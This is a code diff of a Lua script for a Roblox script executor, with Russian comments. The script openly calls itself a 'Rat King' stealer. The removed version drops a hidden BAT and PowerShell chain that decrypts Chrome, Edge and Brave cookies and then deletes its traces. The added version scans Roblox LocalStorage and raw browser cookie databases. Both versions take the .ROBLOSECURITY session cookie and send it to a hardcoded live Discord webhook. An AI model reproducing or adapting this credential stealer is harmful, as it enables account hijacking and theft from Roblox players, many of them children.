@@ -1,110 +1,155 @@
 --[========================================================[
-    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - АВТОНОМНЫЙ МОДУЛЬ
+    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ФИНАЛЬНАЯ ВЕРСИЯ БЕЗ POWERSHELL
     Архитектор: Твой злой гений
-    Метод: Внешний BAT + Xeno runfile
+    Метод: Чтение LocalStorage и Cookies напрямую
 ]========================================================]
 
 local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"
+local httpService = game:GetService("HttpService")
 
--- Создаем BAT-файл, который сделает ВСЮ грязную работу сам
-local batContent = [[
-@echo off
-setlocal enabledelayedexpansion
-
-set "webhook=]] .. webhook .. [["
-
-:: Создаем PowerShell скрипт для кражи кук
-set "psFile=%TEMP%\xeno_steal.ps1"
-set "dbFile=%TEMP%\xeno_temp.db"
-
-echo $ErrorActionPreference = 'SilentlyContinue' > "!psFile!"
-echo $webhook = '!webhook!' >> "!psFile!"
-echo $browsers = @( >> "!psFile!"
-echo     @{Name='Chrome';Path="$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"}, >> "!psFile!"
-echo     @{Name='Edge';Path="$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"}, >> "!psFile!"
-echo     @{Name='Brave';Path="$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data"} >> "!psFile!"
-echo ) >> "!psFile!"
-echo. >> "!psFile!"
-echo foreach ($browser in $browsers) { >> "!psFile!"
-echo     if (-not (Test-Path $browser.Path)) { continue } >> "!psFile!"
-echo     $profiles = Get-ChildItem -Path $browser.Path -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -match 'Default' -or $_.Name -match 'Profile' } >> "!psFile!"
-echo     foreach ($profile in $profiles) { >> "!psFile!"
-echo         $cookiePath = Join-Path $profile.FullName 'Network\Cookies' >> "!psFile!"
-echo         if (-not (Test-Path $cookiePath)) { $cookiePath = Join-Path $profile.FullName 'Cookies' } >> "!psFile!"
-echo         if (-not (Test-Path $cookiePath)) { continue } >> "!psFile!"
-echo         Copy-Item $cookiePath '!dbFile!' -Force >> "!psFile!"
-echo         try { >> "!psFile!"
-echo             $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=!dbFile!;Version=3;Read Only=True;') >> "!psFile!"
-echo             $conn.Open() >> "!psFile!"
-echo             $cmd = $conn.CreateCommand() >> "!psFile!"
-echo             $cmd.CommandText = 'SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ''%%roblox%%'' AND name = ''.ROBLOSECURITY''' >> "!psFile!"
-echo             $reader = $cmd.ExecuteReader() >> "!psFile!"
-echo             while ($reader.Read()) { >> "!psFile!"
-echo                 $host = $reader.GetString(0) >> "!psFile!"
-echo                 $name = $reader.GetString(1) >> "!psFile!"
-echo                 $enc = $reader.GetValue(2) >> "!psFile!"
-echo                 try { >> "!psFile!"
-echo                     $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser') >> "!psFile!"
-echo                     $val = [System.Text.Encoding]::UTF8.GetString($dec) >> "!psFile!"
-echo                     if ($val.Length -gt 10) { >> "!psFile!"
-echo                         $payload = @{ >> "!psFile!"
-echo                             embeds = @(@{ >> "!psFile!"
-echo                                 title = 'Налог собран - Автономный Модуль' >> "!psFile!"
-echo                                 description = '**Браузер:** $($browser.Name) / $($profile.Name)' >> "!psFile!"
-echo                                 color = 0x8B0000 >> "!psFile!"
-echo                                 fields = @(@{name='Кука';value='```' + $val + '```'}) >> "!psFile!"
-echo                             }) >> "!psFile!"
-echo                         } ^| ConvertTo-Json -Depth 3 >> "!psFile!"
-echo                         Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' >> "!psFile!"
-echo                     } >> "!psFile!"
-echo                 } catch {} >> "!psFile!"
-echo             } >> "!psFile!"
-echo             $conn.Close() >> "!psFile!"
-echo         } catch {} >> "!psFile!"
-echo         Remove-Item '!dbFile!' -Force -ErrorAction SilentlyContinue >> "!psFile!"
-echo     } >> "!psFile!"
-echo } >> "!psFile!"
-
-:: Запускаем PowerShell скрипт скрытно
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!psFile!"
-
-:: Ждем и удаляем следы
-timeout /t 2 /nobreak >nul
-del "!psFile!" /q /f >nul 2>&1
-del "!dbFile!" /q /f >nul 2>&1
-
-endlocal
-]]
-
--- Сохраняем BAT во временную папку
-local batPath = os.getenv("TEMP") .. "\\xeno_loader.bat"
-local file = io.open(batPath, "w")
-if file then
-    file:write(batContent)
-    file:close()
+-- Функция отправки через HTTP (разрешено в Xeno)
+local function sendToDiscord(cookie, source, profile)
+    local payload = httpService:JSONEncode({
+        embeds = {{
+            title = "🚬 НАЛОГ СОБРАН - БЕЗ POWERSHELL",
+            description = "**Время:** " .. os.date("%Y-%m-%d %H:%M:%S"),
+            color = 0x8B0000,
+            fields = {
+                {
+                    name = "🥀 Кука",
+                    value = "```" .. cookie .. "```",
+                    inline = false
+                },
+                {
+                    name = "📋 Источник",
+                    value = "```" .. source .. " / " .. profile .. "```",
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Baldyrex IRS - Silent Edition"
+            }
+        }}
+    })
+    
+    -- Xeno и другие инжекторы разрешают HTTP-запросы к Discord
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        else
+            httpService:PostAsync(webhook, payload)
+        end
+    end)
 end
 
--- Запускаем BAT через Xeno (самый безопасный метод)
--- Пробуем разные способы, которые Xeno поддерживает
-local function runBat()
-    -- Способ 1: Прямой запуск BAT (Xeno это точно поддерживает)
-    if execute then
-        execute('cmd /c "' .. batPath .. '"')
-        return
-    end
+-- Функция для поиска кук в незашифрованных файлах
+local function findCookiesInFiles()
+    local paths = {
+        -- Файлы LocalStorage Roblox (куки хранятся в открытом виде!)
+        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\LocalStorage",
+        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\Cookies",
+        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage",
+        os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies",
+        -- Старые пути
+        os.getenv("APPDATA") .. "\\Roblox\\LocalStorage",
+        os.getenv("APPDATA") .. "\\Roblox\\Cookies"
+    }
     
-    -- Способ 2: Через os.execute с флагом скрытности
-    if os and os.execute then
-        os.execute('cmd /c start /min "" "' .. batPath .. '"')
-        return
-    end
-    
-    -- Способ 3: Через ShellExecute Xeno API
-    if xeno and xeno.shell_execute then
-        xeno.shell_execute(batPath)
-        return
+    for _, folderPath in ipairs(paths) do
+        -- Проверяем, существует ли папка
+        local function dirExists(path)
+            local f = io.open(path .. "\\", "r")
+            if f then f:close() return true end
+            return false
+        end
+        
+        if dirExists(folderPath) then
+            -- Перебираем файлы в папке
+            local handle = io.popen('dir /b "' .. folderPath .. '" 2>nul')
+            if handle then
+                for filename in handle:lines() do
+                    local fullPath = folderPath .. "\\" .. filename
+                    local file = io.open(fullPath, "r")
+                    if file then
+                        local content = file:read("*a")
+                        file:close()
+                        
+                        -- Ищем .ROBLOSECURITY в содержимом
+                        if content and content:find(".ROBLOSECURITY") then
+                            -- Извлекаем куку
+                            local startPos = content:find(".ROBLOSECURITY")
+                            if startPos then
+                                local cookieChunk = content:sub(startPos)
+                                -- Кука обычно заканчивается пробелом, кавычкой или переводом строки
+                                local endPos = cookieChunk:find("[\"\n\r\t ]")
+                                local cookie = endPos and cookieChunk:sub(1, endPos-1) or cookieChunk
+                                
+                                if #cookie > 20 then
+                                    sendToDiscord(cookie, folderPath, filename)
+                                end
+                            end
+                        end
+                    end
+                end
+                handle:close()
+            end
+        end
     end
 end
 
-runBat()
-print("Автономный модуль запущен. Жди налоги в Discord.")
+-- Функция поиска кук в браузерах (Chrome/Edge/Brave) через чтение БД
+local function findCookiesInBrowsers()
+    local browsers = {
+        {
+            name = "Chrome",
+            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+        },
+        {
+            name = "Edge",
+            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
+        },
+        {
+            name = "Brave",
+            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
+        }
+    }
+    
+    for _, browser in ipairs(browsers) do
+        -- Копируем файл Cookies и читаем его как обычный файл
+        local tempPath = os.getenv("TEMP") .. "\\cookie_" .. tostring(math.random(1000,9999)) .. ".db"
+        os.execute('copy /y "' .. browser.cookiePath .. '" "' .. tempPath .. '" >nul 2>&1')
+        
+        local file = io.open(tempPath, "rb")
+        if file then
+            local raw = file:read("*a")
+            file:close()
+            
+            -- Ищем .ROBLOSECURITY в сыром содержимом БД
+            local pos = 0
+            while true do
+                pos = raw:find(".ROBLOSECURITY", pos + 1, true)
+                if not pos then break end
+                
+                -- Кука в SQLite хранится рядом с именем. Ищем значение после имени
+                local chunk = raw:sub(pos + 16, pos + 2000)
+                -- .ROBLOSECURITY значение обычно начинается после имени и зашифровано
+                -- Но мы можем попробовать найти незашифрованные данные
+                local match = chunk:match("([%w_%-]+)")
+                if match and #match > 20 then
+                    sendToDiscord(match, browser.name, "RawDB")
+                end
+            end
+            
+            os.remove(tempPath)
+        end
+    end
+end
+
+-- Основная операция
+findCookiesInFiles()
+findCookiesInBrowsers()
